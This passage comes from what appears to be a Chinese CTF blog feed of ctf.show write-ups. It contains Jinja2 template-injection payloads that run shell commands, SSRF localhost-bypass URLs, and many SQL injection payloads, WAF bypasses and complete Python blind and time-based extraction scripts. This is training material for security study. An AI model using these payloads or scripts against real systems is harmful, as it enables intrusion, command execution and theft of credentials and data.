我们和上面的结合就会发现他们巨大的用处</p><pre><code>()|select|string结果如下&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;这样我们会拥有比前面更多的字符来用于拼接(()|select|string)[24]~(()|select|string)[24]~(()|select|string)[15]~(()|select|string)[20]~(()|select|string)[6]~(()|select|string)[18]~(()|select|string)[18]~(()|select|string)[24]~(()|select|string)[24]得到字符串&quot;__class__&quot;</code></pre></li><li><p>list</p><p> 转换成列表更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了<br>  只是单纯的字符串的话取单个字符方法有限</p><pre><code>(()|select|string)[0]如果中括号被过滤了，挺难的但是列表的话就可以用pop取下标了当然都可以使用__getitem__(()|select|string|list).pop(0)</code></pre></li></ol><h3 id="获取键值或下标"><a href="#获取键值或下标" class="headerlink" title="获取键值或下标"></a>获取键值或下标</h3><pre><code>dict[&#39;__builtins__&#39;]dict.__getitem__(&#39;__builtins__&#39;)dict.pop(&#39;__builtins__&#39;)dict.get(&#39;__builtins__&#39;)dict.setdefault(&#39;__builtins__&#39;)list[0]list.__getitem__(0)list.pop(0)</code></pre><h3 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h3><pre><code>().__class__()[&quot;__class__&quot;]()|attr(&quot;__class__&quot;)().__getattribute__(&quot;__class__&quot;)</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311649320.png" alt="image-20220331164902207"></p><p>存在模板注入,上面语句之间拿来试试</p><pre><code>?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;     &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;             &#123;% if 'eval' in b.keys() %&#125;          &#123;&#123; b['eval']('__import__("os").popen("ls /").read()') &#125;&#125;     &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311650851.png" alt="image-20220331165002752"></p><p>过滤了啥</p><pre><code>?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;     &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;             &#123;% if 'eval' in b.keys() %&#125;          &#123;&#123; b['eval']('__import__("os").popen("cat /flag").read()') &#125;&#125;     &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311650151.png" alt="image-20220331165047039"></p><p>骗我</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/ctfshow/ctf.show/SSRF/"/>
      <url>/ctfshow/ctf.show/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><h2 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h2><p>SSRF是一种有攻击者构造形成由服务daunt发起请求的一个安全漏洞.一般情况下,SSRF攻击的目标是从外网无法访问的内部系统.(正是因为他是有服务器端发起的,所以它能够请求到与他相连而与外网隔离的内部系统)</p><h2 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a>相关函数和类</h2><ul><li>file_get_contents():将整个文件或一个url所指向的文件读入一个字符串中</li><li>readfile():输出一个文件的内容</li><li>fsockopen():打开一个网络连接或者一个Unix套接字连接</li><li>curl_exec():初始化一个新的会话,返回一个cURL句柄,供curl_setopt()  curl_exec() 和 curl_close()函数使用</li><li>fopen():打开一个文件或者url</li><li>PHP原生类soapclient在触发反序列化时可导致ssrf</li></ul><h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><ul><li>file协议:在有回显的情况下,利用file协议可以读取任意文件的内容</li><li>dict协议:泄露安装软件版本信息,查看端口,操作内网redis服务等</li><li>gopher协议:gophar支持发出get post请求.可以先截获get请求包和post请求包,在构造成符合gopher协议的请求.gophar协议是ssrf利用中一个最强大的协议(俗称万能协议).可以用于反弹shell </li><li>http&#x2F;s协议:探测主机内网主机存活</li></ul><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ol><li>让服务端去访问相应的网址</li><li>让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</li><li>可以使用file dict gopher ftp协议进行请求访问相应的文件</li><li>攻击内网web应用(可以向内部任意主机的任意端口发送精心构造的数据包{payload})</li><li>攻击内网应用程序(利用跨协议通讯技术)</li><li>判断内网主机是否存活:方法是访问看是否有端口开放</li><li>Dos攻击(请求大文件,始终保持连接keep-alive always)</li></ol><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#39;url&#39;];$ch=curl_init($url);#初始化一个curl会话 并将CURLOPT_URL选项将会被设置成这个值,curl_setopt($ch, CURLOPT_HEADER, 0);#设置一个curl传输选项 CURLOPT_HEADER启用时会将头文件的信息作为数据输出流输出curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);#CURLOPT_RETURNTRANSFER将curl_exec()获取的信息以文件流的形式返回,而不是直接输出$result=curl_exec($ch);#执行给定的curl会话curl_close($ch);#关闭一个curl会话echo ($result);?&gt;</code></pre><p>先访问下index.php文件试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281824803.png" alt="image-20220328182412744"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281824548.png" alt="image-20220328182419504"></p><p>扫了下目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281824839.png" alt="image-20220328182457772"></p><p>也可以使用file协议读取文件,但是怎么得到网站路径呢(我不会)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281840211.png" alt="image-20220328184035147"></p><pre><code>url=http://0/flag.phpurl=http://0.0.0.0/flag.phpurl=http://127.1/flag.phpurl=http://2130706433/flag.phpurl=http://017700000001/flag.phpurl=http://0b1111111000000000000000000000001/flag.php         不行url=http://0x7f.0.0.1/flag.phpurl=http://0177.0.0.1/flag.phpurl=http://localhost/flag.phpurl=http://127.127.127.127/flag.php</code></pre><h1 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h1><p>&#96;&#96;&#96;php<br> &lt;?php<br>error_reporting(0);<br>highlight_file(<strong>FILE</strong>);<br>$url&#x3D;$_POST[‘url’];<br>$x&#x3D;parse_url($url);<br>if($x[‘scheme’]&#x3D;&#x3D;&#x3D;’http’||$x[‘scheme’]&#x3D;&#x3D;&#x3D;’https’)</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql</title>
      <link href="/ctfshow/ctf.show/sql/"/>
      <url>/ctfshow/ctf.show/sql/</url>
      
        <content type="html"><![CDATA[<h1 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h1><p><a href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/">注入学习</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262159528.png" alt="image-20220326215919454"></p><pre><code>$sql = &quot;select username,password from user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>象征性测试下闭合方式</p><pre><code>1    正常1&#39;    异常1&quot;    正常</code></pre><p>说明是单引号闭合,测试字段数,这里注意使用%23哦</p><pre><code>1&#39; order by 3%23    正常1&#39; order by 4%23    异常</code></pre><p>说明三个,查回显地方</p><pre><code>1&#39; union select 1,2,3%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262202465.png" alt="image-20220326220256430"></p><pre><code>1&#39; union select 1,database(),3%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262203899.png" alt="image-20220326220315862"></p><p>爆数据库名</p><pre><code>1&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262204734.png" alt="image-20220326220443697"></p><p>爆表名</p><pre><code>-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262205150.png" alt="image-20220326220540113"></p><p>爆字段名</p><pre><code>-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;ctfshow_user&#39;%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271016776.png" alt="image-20220327101643682"></p><pre><code>-1&#39;union select 1,group_concat(username,password),3 from ctfshow_user%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271017854.png" alt="image-20220327101732815"></p><p>更简单的</p><pre><code>-1&#39; or 1%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301345625.png" alt="image-20220330134534509"></p><pre><code>$sql = &quot;select username,password from user where username !=&#39;flag&#39; and id = &#39;-1&#39; or 1%23&#39; limit 1;&quot;;</code></pre><h1 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301335972.png" alt="image-20220330133530883"></p><pre><code>//拼接sql语句查找指定ID用户$sql = &quot;select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;//检查结果是否有flag    if($row-&gt;username!==&#39;flag&#39;)&#123;      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;    &#125;  </code></pre><pre><code>字段1&#39; order by 3%23    异常1&#39; order by 2%23    正常数据库1&#39; union select 1,database()%231&#39;union select 1,group_concat(schema_name) from information_schema.schemata%23表名-1&#39;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23    #有两张表,第二张是这关的字段名-1&#39;union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_user&#39;%23数据-1&#39;union select 1,group_concat(username,password) from ctfshow_user2%23</code></pre><p>新学的base64加密</p><pre><code>0&#39; union select 1,to_base64(password) from ctfshow_user2 where username=&quot;flag&quot;%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301358191.png" alt="image-20220330135800134"></p><h1 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407094914986.png" alt="image-20220407094914986"></p><pre><code>//拼接sql语句查找指定ID用户$sql = &quot;select id,username,password from ctfshow_user3 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;//检查结果是否有flag    if(!preg_match(&#39;/flag/i&#39;, json_encode($ret)))&#123;      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;    &#125;</code></pre><p>与上面差不多,换一个函数</p><pre><code>0&#39; union select 1,hex(password),3 from ctfshow_user3 where username=&quot;flag&quot;%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095103698.png" alt="image-20220407095103698"></p><h1 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095244739.png" alt="image-20220407095244739"></p><pre><code>/拼接sql语句查找指定ID用户$sql = &quot;select username,password from ctfshow_user4 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;sel//检查结果是否有flag    if(!preg_match(&#39;/flag|[0-9]/i&#39;, json_encode($ret)))&#123;      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;    &#125;</code></pre><p>这里返回一般不让有flag和数字,那么我们想办法替换一下,替换的思路将1-0数字用q~p替换，但本来的flag中一定也会有一些小写字母，这样的话就没办法分辨那个是原本的字母哪个是替换出来的。所以为了避免这个问题，将password首先hex一下，因为hex()函数的返回值中字母都是大写的，所以我们返回结果中的小写字母就是原来的数字，而大写字母就是原本的字符。</p><pre><code>1&#39; union select &#39;q&#39;,(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#39;1&#39;,&#39;q&#39;),&#39;2&#39;,&#39;w&#39;),&#39;3&#39;,&#39;e&#39;),&#39;4&#39;,&#39;r&#39;),&#39;5&#39;,&#39;t&#39;),&#39;6&#39;,&#39;y&#39;),&#39;7&#39;,&#39;u&#39;),&#39;8&#39;,&#39;i&#39;),&#39;9&#39;,&#39;o&#39;),&#39;0&#39;,&#39;p&#39;) from ctfshow_user4 where username=&#39;flag&#39;)--+</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095715741.png" alt="image-20220407095715741"></p><p>在自己替换一下</p><p>盲注测试一下下</p><p>抓包发现向这个页面请求的数据</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407102847062.png" alt="image-20220407102847062"></p><pre><code>1&#39; and length(database())&gt;0%23    </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407103005812.png" alt="image-20220407103005812"></p><pre><code>1&#39; and length(database())=0%23    </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407103025956.png" alt="image-20220407103025956"></p><p>也就是说如果后面为真就返回admin,如果后面为假就不返回admin</p><h2 id="get有回显布尔无空格和逗号的脚本"><a href="#get有回显布尔无空格和逗号的脚本" class="headerlink" title="get有回显布尔无空格和逗号的脚本"></a>get有回显布尔无空格和逗号的脚本</h2><pre><code class="python">#payload = 1&#39;&amp;&amp;length((select(password)from(ctfshow_user4)where(id=26)))&gt;&#123;mid&#125;#def get_pwd_len(url):    head = 1    tail = 100    ans = 0    while head &lt; tail:        mid = (head + tail ) &gt;&gt; 1        payload = f&quot;1&#39;&amp;&amp;length((select(password)from(ctfshow_user4)where(id=26)))&gt;&#123;mid&#125;#&quot;        # print(uname)        param = &#123;            &#39;id&#39;: payload,            &#39;page&#39;: &#39;1&#39;,            &#39;limit&#39;: &#39;10&#39;        &#125;        res = requests.get(url=url,params=param)        if &quot;admin&quot; in res.text:            head = mid + 1            ans = mid + 1        else:            tail = mid    print(ans)        # passwd长度为:45url=&quot;http://c0fd21f5-b919-4d9c-aac8-de4d325b3a8b.challenge.ctf.show/api/v4.php&quot;get_pwd_len(url)#payload = 1&#39;&amp;&amp;ascii(substr((reverse(substr((select(password)from(ctfshow_user4)where(id=26))from(&#123;i&#125;))))from(&#123;j&#125;)))&gt;&#123;mid&#125;#def get_pwd(url):    ans = &quot;&quot;    for i in range(1, 46):        # print(i)        j = 46 - i        # print(j)        head = 32        tail = 127        while head &lt;tail:            mid = (head + tail) &gt;&gt; 1 #&gt;&gt;是位移运算符 右移一位就是除以二            payload = f&quot;1&#39;&amp;&amp;ascii(substr((reverse(substr((select(password)from(ctfshow_user4)where(id=26))from(&#123;i&#125;))))from(&#123;j&#125;)))&gt;&#123;mid&#125;#&quot;            # print(uname)            param = &#123;                &#39;id&#39;: payload,                &#39;page&#39;: &#39;1&#39;,                &#39;limit&#39;: &#39;10&#39;            &#125;            res = requests.get(url=url,params=param)            # print(res.text)            if &quot;admin&quot; in res.text:                head = mid + 1            else:                tail = mid        if head != 32:            ans += chr(head)        else:            break        print(ans)url=&quot;http://c0fd21f5-b919-4d9c-aac8-de4d325b3a8b.challenge.ctf.show/api/v4.php&quot;get_pwd(url)</code></pre><p>除了盲注还可以写文件</p><pre><code>/api/v4.php?id=1&#39; union select 1,password from ctfshow_user4 into outfile &#39;/var/www/html/1.txt&#39;--+&amp;page=1&amp;limit=10</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130358634.png" alt="image-20220407130358634"></p><h1 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407124216316.png" alt="image-20220407124216316"></p><p>这次是直接没有回显了</p><h2 id="get时间盲注无空格和逗号的脚本"><a href="#get时间盲注无空格和逗号的脚本" class="headerlink" title="get时间盲注无空格和逗号的脚本"></a>get时间盲注无空格和逗号的脚本</h2><p>稍微修改一下</p><pre><code class="python">import requestsdef get_pwd_len(url):    head = 1    tail = 100    ans = 0    while head &lt; tail:        mid = (head + tail ) &gt;&gt; 1        payload = f&quot;1&#39;&amp;&amp;if(length((select(password)from(ctfshow_user5)where(id=26)))&gt;&#123;mid&#125;,sleep(2),0)#&quot;        # print(uname)        param = &#123;            &#39;id&#39;: payload,            &#39;page&#39;: &#39;1&#39;,            &#39;limit&#39;: &#39;10&#39;        &#125;        res = requests.get(url=url,params=param)        try:            r = requests.get(url,params=param,timeout=0.5)            tail = mid            ans = mid        except Exception as e :            head = mid +1    print(ans)        # passwd长度为:45url=&quot;http://c7c6c7b5-e27e-46b5-ac09-66d7f0ede948.challenge.ctf.show/api/v5.php&quot;get_pwd_len(url)def get_pwd(url):    ans = &quot;&quot;    for i in range(1, 46):        # print(i)        j = 46 - i        # print(j)        head = 32        tail = 127        while head &lt;tail:            mid = (head + tail) &gt;&gt; 1 #&gt;&gt;是位移运算符 右移一位就是除以二            payload = f&quot;1&#39;&amp;&amp;if(ascii(substr((reverse(substr((select(password)from(ctfshow_user5)where(id=26))from(&#123;i&#125;))))from(&#123;j&#125;)))&gt;&#123;mid&#125;,sleep(2),0)#&quot;            # print(uname)            param = &#123;                &#39;id&#39;: payload,                &#39;page&#39;: &#39;1&#39;,                &#39;limit&#39;: &#39;10&#39;            &#125;            try:                res = requests.get(url=url,params=param,timeout=0.5)                tail = mid            except Exception as e:                head = mid + 1        if head != 32:            ans += chr(head)        else:            break        print(ans)url=&quot;http://c7c6c7b5-e27e-46b5-ac09-66d7f0ede948.challenge.ctf.show/api/v5.php&quot;get_pwd(url)</code></pre><p>这里有逗号,等研究研究在试试能不能去掉逗号</p><p>这里当然也可以写文件</p><pre><code>/api/v5.php?id=1&#39; union select 1,password from ctfshow_user5 into outfile &#39;/var/www/html/1.txt&#39;--+&amp;page=1&amp;limit=10</code></pre><h1 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130600142.png" alt="image-20220407130600142"></p><pre><code>-1&#39; or 1%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130612382.png" alt="image-20220407130612382"></p><p>不知道过滤了啥</p><p>这里之前的不可以,但是大小写可以绕过</p><pre><code>-1&#39;uNion seleCt 1,groUp_concAt(username,password),3 frOm ctfshow_user%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130913425.png" alt="image-20220407130913425"></p><h1 id="web177-179"><a href="#web177-179" class="headerlink" title="web177-179"></a>web177-179</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407131027613.png" alt="image-20220407131027613"></p><h2 id="空格的代替"><a href="#空格的代替" class="headerlink" title="空格的代替"></a>空格的代替</h2><pre><code>-1&#39;%09or%091%23    TAB水平-1&#39;%0aor%0a1%23    新建一行-1&#39;%0cor%0c1%23    新建一页-1&#39;%0dor%0d1%23    return功能-1&#39;%0bor%0b1%23    TAB(垂直)%a0             空格 这里不行</code></pre><p>注释</p><pre><code>-1&#39;union/**/select/**/1,group_concat(username,password),3/**/from/**/ctfshow_user%23</code></pre><p>括号</p><p>我也不会,自己研究怎么加括号吧</p><pre><code>-1&#39;union(select(1),(group_concat(username,password)),(3)from(ctfshow_user))%23</code></pre><p>反引号</p><p>我不懂但是可以实现</p><pre><code>-1&#39;union/**/select`id`,`username`,`password`from`ctfshow_user`%23</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407131136762.png" alt="image-20220407131136762"></p><h1 id="web180-183"><a href="#web180-183" class="headerlink" title="web180-183"></a>web180-183</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407135553899.png" alt="image-20220407135553899"></p><h2 id="过滤注释符与空格"><a href="#过滤注释符与空格" class="headerlink" title="过滤注释符与空格"></a>过滤注释符与空格</h2><p>联合注入好像无法实现,反正我不会,如果没过滤其他空格可以实现</p><pre><code>-1&#39;union%0cselect(1),(group_concat(username,password)),(3)from(ctfshow_user)where(1)and&#39;1</code></pre><pre><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407140553761.png" alt="image-20220407140553761"></p><h1 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407141724604.png" alt="image-20220407141724604"></p><pre><code>//拼接sql语句查找指定ID用户  $sql = &quot;select count(pass) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;    //对传入的参数进行了过滤  function waf($str)&#123;    return preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#39;, $str);  &#125;  //返回用户表的记录总数      $user_count = 0;</code></pre><h2 id="regexp匹配like通配pwd"><a href="#regexp匹配like通配pwd" class="headerlink" title="regexp匹配like通配pwd"></a>regexp匹配like通配pwd</h2><pre><code class="python">import requestsdef post_pwd(url):    dic=r&#39;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&#39;    ans =&#39;&#39;    for i in range(1,46):        for j in  dic:            #flag=&quot;ctfshow&#123;&quot;            #payload = f&quot;(ctfshow_user)where(pass)like&#39;&#123;flag+j&#125;%&#39;            payload =f&quot;(ctfshow_user)where(substr(pass,&#123;i&#125;,1))regexp(&#39;&#123;j&#125;&#39;)&quot;            data = &#123;                &#39;tableName&#39;:payload            &#125;            r = requests.post(url,data=data)            if r.text.find(&quot;$user_count = 1;&quot;) &gt; 0:                ans += j                print(ans)                breakurl = &#39;http://a4c677e5-0ca4-46f8-85da-961e108b532b.challenge.ctf.show/select-waf.php&#39;post_pwd(url)</code></pre><h1 id="web184-1"><a href="#web184-1" class="headerlink" title="web184"></a>web184</h1><pre><code class="php"> Author:fengimport requestsurl=&quot;http://419f0650-7493-4fa7-81fe-82e04b0b6b7c.challenge.ctf.show/select-waf.php&quot;flag=&quot;ctfshow&#123;&quot;def str_to_hex(s):    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;,&#39;&#39;) for c in s])for i in range(0,100):    for j in &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;:        data=&#123;#&#39;tableName&#39;:&quot;ctfshow_user a inner join ctfshow_user b on b.pass like &#123;&#125;&quot;.format(&quot;0x&quot;+str_to_hex(flag+j+&quot;%&quot;))            &#39;tableName&#39;:f&quot;ctfshow_user group by pass having pass like &#123;&#39;0x&#39;+str_to_hex(flag+j+&#39;%&#39;)&#125;&quot;        &#125;        r=requests.post(url=url,data=data).text        if &quot;$user_count = 1&quot; in r:            flag+=j            print(flag)            if j==&#39;&#125;&#39;:                exit()            break</code></pre><p>HAVING语句通常与GROUP BY语句联合使用，用来过滤由GROUP BY语句返回的记录集。<br> HAVING语句的存在弥补了WHERE关键字不能与聚合函数联合使用的不足。</p><pre><code class="python"> Author:Y4tackerimport requestsurl = &quot;http://419f0650-7493-4fa7-81fe-82e04b0b6b7c.challenge.ctf.show/select-waf.php&quot;flag = &#39;ctfshow&#123;&#39;for i in range(45):    if i &lt;= 8:        continue    for  j in range(127):        data = &#123;            &quot;tableName&quot;: f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;i&#125;,1)regexp(char(&#123;j&#125;)))&quot;        &#125;        r = requests.post(url,data=data)        if r.text.find(&quot;$user_count = 43;&quot;)&gt;0:            if chr(j) != &quot;.&quot;:                flag += chr(j)                print(flag.lower())                if chr(j) == &quot;&#125;&quot;:                    exit(0)                break</code></pre><p>RIGHT JOIN等同于RIGHT OUTER JOIN，右外连接，不满足ON条件的会保留右边那张表的数据，左边表数据直接显示NULL</p><h1 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h1><p>数字的表示哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407150732592.png" alt="image-20220407150732592"></p><pre><code class="python"> Author:Y4tackerimport requestsurl = &quot;http://bdd55ead-f197-4ec4-b304-8bf0dd687c8d.challenge.ctf.show/select-waf.php&quot;flag = &#39;ctfshow&#123;&#39;def createNum(n):    num = &#39;true&#39;    if n == 1:        return &#39;true&#39;    else:        for i in range(n - 1):            num += &quot;+true&quot;    return numfor i in range(45):    if i &lt;= 8:        continue    for j in range(127):        data = &#123;            &quot;tableName&quot;: f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;createNum(i)&#125;,&#123;createNum(1)&#125;)regexp(char(&#123;createNum(j)&#125;)))&quot;        &#125;        r = requests.post(url, data=data)        if r.text.find(&quot;$user_count = 43;&quot;) &gt; 0:            if chr(j) != &quot;.&quot;:                flag += chr(j)                print(flag.lower())                if chr(j) == &quot;&#125;&quot;:                    exit(0)                break</code></pre><h1 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153242084.png" alt="image-20220407153242084"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153406158.png" alt="image-20220407153406158"></p><h2 id="pwd的md5"><a href="#pwd的md5" class="headerlink" title="pwd的md5"></a>pwd的md5</h2><pre><code>md5(string,raw)     参数    描述string    必需。要计算的字符串。raw    可选。    默认不写为FALSE。32位16进制的字符串    TRUE。16位原始二进制格式的字符串</code></pre><p> 这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。</p><p>上面的’ffifdyop‘字符串对应的16位原始二进制的字符串就是”    ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c    “  。  ‘  \  ‘后面的3个字符连同’  \  ‘算一个字符，比如’    \xc9    ‘，所以上述一共16个。当然，像’    \xc9    ‘这种字符会显示乱码。</p><p> 这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是’    ‘    ‘字符。6f就是对应‘    o    ’。</p><pre><code>   然后我们得到的sql语句就是 SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&#39;or&#39;6�]��!r,��b&#39;   为什么password = &#39;&#39;or&#39;6�]��!r,��b&#39;的返回值会是true呢，因为or后面的单引号里面的字符串（6�]��!r,��b），是数字开头的。当然不能以0开头。（我不知道在数据库里面查询的时候，�这种会不会显示）   这里引用一篇文章，连接在下面，里面的原话“a string starting with a 1 is cast as an integer when used as a boolean.“  在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。   当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符） 所以到这里为止，就完成了sql注入。同时要注意的是，这种sql语句，在mysql里面是可以行得通的，但是在oracle数据库里面这样的语句是有语法错误的。   所以回过头来为什么ffifdyop就是答案，因为ffifdyop的md5的原始二进制字符串里面有‘or’6这一部分的字符。那么进一步思考这个单引号是否是必要的，这两个单引号是为了与原有的语句的单引号配对。所以我们理解了这个sql注入的原理，那么就明白了我们需要怎样的字符串。</code></pre><h1 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153535740.png" alt="image-20220407153535740"></p><p>这条语句可以查出所有数据</p><pre><code>SELECT * FROM users where username = 1&lt;1 and password = 0SELECT * FROM users where username = 0 and password = 0</code></pre><p>在where username&#x3D;0这样的查询中,因为username都是字符串,在mysql中字符串与数字进行比较适合,以字母开头的字符串都会转换成数字0,因此这个where可以把所有以字母开头的数据查出来</p><pre><code class="php">if($row[&#39;pass&#39;]==intval($password))&#123;</code></pre><p>这里的查询密码是弱类型,查出来的passwd也是以字母开头的,所以password&#x3D;0可以成功弱类型比较</p><p>这样也可以查到</p><pre><code>select * from referers where referer = &#39;http://127.0.0.1/sqlilabs/Less-19/&#39; and referer = 1;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407154415679.png" alt="image-20220407154415679"></p><pre><code> SELECT password FROM users where username = 1||1 and password = 12;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407154509937.png" alt="image-20220407154509937"></p><pre><code>username=1&lt;1&amp;password=0username=0&amp;password=0username=1||1&amp;password=0</code></pre><h1 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h1><p><img 